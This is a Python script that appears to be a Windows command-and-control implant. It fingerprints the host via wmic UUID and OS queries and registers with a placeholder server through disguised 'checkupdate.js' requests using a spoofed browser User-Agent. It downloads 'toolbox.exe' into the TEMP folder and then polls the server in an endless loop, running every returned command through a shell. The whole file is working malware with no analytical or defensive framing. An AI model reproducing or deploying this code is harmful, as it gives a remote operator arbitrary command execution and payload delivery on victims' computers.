import urllib2, base64
import subprocess
import time, os, random




serverHOST = "http://{API_FQDN}"
updatesURL = "{}/checkupdate.js?id={}&token={}&platform={}"


headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'}
stealthHeaders = {'User-Agent': 'JustKidding'}


def customBase64(encodedTxt, decode=1):
	replacements_ = [['+', 'plus'], ['/', 'slash'], ['=', 'equal']]
	if decode == -1:
		encodedTxt = base64.b64encode(encodedTxt)
		for i in replacements_:
			encodedTxt = encodedTxt.replace(i[0], i[1])
		return encodedTxt
	for i in replacements_:
		encodedTxt = encodedTxt.replace(i[::-1][0], i[::-1][1])
	return base64.b64decode(encodedTxt)




def runCMD(query):
	output = subprocess.check_output(query, shell=True)
	return output




def adjustCMD(query):
	altsArr = {'sleep': 'timeout', '/data/data/net.orange.bolt/': "", '-w 10;': '-w 10',\
	"ping -c": "ping -n", " ; ": " & ", "elf.out": "{}\\toolbox.exe".format(os.environ['TEMP']), "cat ": "type "}
	for k, v in altsArr.items():
		query = query.replace(k, v)
	if "echo -e" in query:
		replace_me = query[query.index('echo -e'):]
		replace_me = replace_me[:replace_me.index('|')-1]
		temp_file = "{}\\{}.txt".format(os.environ['TEMP'], random.randint(10000,99999))
		with open(temp_file, "w") as f:
			f.write(replace_me[8:].replace("\\r\\n", "\n")[1:-1])
		query = query.replace(replace_me, "type " + temp_file)
	elif 'ip route' in query:
		query = 'echo ' + [i for i in runCMD('ipconfig').split('\r\n') if 'IPv4' in i][0].split(' : ')[-1] + ' ' + query[::-1][:query[::-1].index('|')+1][::-1]
	return query




getUUID = [i.replace(' ', '') for i in runCMD("wmic path win32_computersystemproduct get uuid").split('\r') if len(i.replace(' ', ''))>10][0]\
		  .replace('\r', '').replace('\n', '').replace('-','')

getPlatform = ' '.join([i.replace(' ', '').replace('\n', '').split('=')[1] for i in runCMD("wmic os get Caption,CSDVersion /value").split('\r') if len(i.replace(' ', ''))>5])



## Initialisation ##
fqdn = updatesURL.format(serverHOST, getUUID, 0, customBase64(getPlatform, -1))
req = urllib2.Request(fqdn, headers=headers)
_ = urllib2.urlopen(req)




def getCMD():
	global serverHOST, getUUID, getPlatform
	fqdn = updatesURL.format(serverHOST, getUUID, 'updated', customBase64(getPlatform, -1))
	req = urllib2.Request(fqdn, headers=stealthHeaders)
	f = urllib2.urlopen(req)
	respCMD = f.read()
	if 'runcmd=' in respCMD:
		respCMD = adjustCMD(respCMD[7:])
	return respCMD




runThisArr = ['timeout' for i in range(52)]
standByCounter = 0
loopCount = -1



furl = urllib2.urlopen('{}/assets/toolbox.exe'.format(serverHOST))
toolbin = furl.read()
with open('{}\\toolbox.exe'.format(os.environ['TEMP']), 'wb') as f:
	f.write(toolbin)




while True:
	loopCount += 1
	runThis = getCMD()
	runThisArr[loopCount%50 + 2] = runThis
	if (not ('timeout' in runThisArr[loopCount%50 + 2] and 'timeout' not in runThisArr[loopCount%50 + 1]) or standByCounter > 30):
		print("[!] Running: {}".format(runThis))
		runCMD(runThis)
		standByCounter = 0
	else:
		loopCount -= 1
		standByCounter += 1
		time.sleep(1)



